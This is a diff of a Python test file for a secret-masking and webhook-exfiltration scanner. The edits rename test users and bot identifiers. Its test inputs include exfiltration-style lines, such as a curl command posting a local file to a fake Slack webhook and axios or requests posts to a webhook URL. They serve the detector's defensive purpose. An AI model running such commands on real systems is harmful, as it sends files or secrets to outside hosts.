@@ -57,7 +57,7 @@ class EnclosingExpression(Folder):
                      "Post it: `curl -X POST -d @d.json https://hooks.slack.com/services/T0/B0/FAKE`",
                      "```js\naxios.post('" + HOOK + "', body)\n```"):
             self.assertEqual(rules_of(HEAD + line + "\n"), {"WT-T018"}, line)
-        # batch 7b (Ken, Option A): only one plain literal passed straight to a recognised send, or the single URL of a plain
+        # batch 7b (decision: Option A): only one plain literal passed straight to a recognised send, or the single URL of a plain
         # curl line, stays WT-T018; these were WT-T018 and are now WT-T005
         for line in ("```python\nrequests.request('POST', '" + HOOK + "', json=payload)\n```",
                      "```python\nurl = '" + HOOK + "'\n```", "```json\n{\"webhook\": \"https://hooks.slack.com/services/T0/B0/FAKE\"}\n```",
@@ -221,9 +221,9 @@ class QuotedYamlKeys(History):
         self.assertEqual(doc["masked"], wt.MASK_VERSION)
 
     def test_json_and_other_keys_are_read_as_before(self):   # guard
-        self.assertEqual(wt.mask_secrets('{"password": "FAKE", "user": "ken"}'), '{"password": [hidden], "user": "ken"}')
-        for s in ('"name": |\n  hello there\n', '"description": a long line of words\n', '  "token_count": 5,\n  "user": "ken"\n'):
-            self.assertEqual(wt.mask_secrets(s), s if "token" not in s else '  "token_count": [hidden]\n  "user": "ken"\n', s)
+        self.assertEqual(wt.mask_secrets('{"password": "FAKE", "user": "admin"}'), '{"password": [hidden], "user": "admin"}')
+        for s in ('"name": |\n  hello there\n', '"description": a long line of words\n', '  "token_count": 5,\n  "user": "admin"\n'):
+            self.assertEqual(wt.mask_secrets(s), s if "token" not in s else '  "token_count": [hidden]\n  "user": "admin"\n', s)
 
 
 # ---------------------------------------------------------------- high (c4): webhook URLs over line joins and JSON escapes
@@ -332,7 +332,7 @@ class CorroborationIndex(Folder):
         d = self.d
         places = [d, d + "/", d + "/a", d + "/a/", d + "/a/SKILL.md", d + "/a/ref.md", d + "/a/sub", d + "/a/sub/SKILL.md",
                   d + "/a/sub/deeper/notes.md", d + "/b", d + "/b/SKILL.md", d + "/ab/SKILL.md", "/", "/nowhere/x.md", "",
-                  "rollcall:Foxtrot:routine:digest", "rollcall:Foxtrot", "rollcall:Echo:memory:1", "settings", "settings/x"]
+                  "rollcall:bot-f:routine:digest", "rollcall:bot-f", "rollcall:bot-e:memory:1", "settings", "settings/x"]
         rng = random.Random(20261018)
         for run in range(500):
             fs = self.random_findings(rng, places)
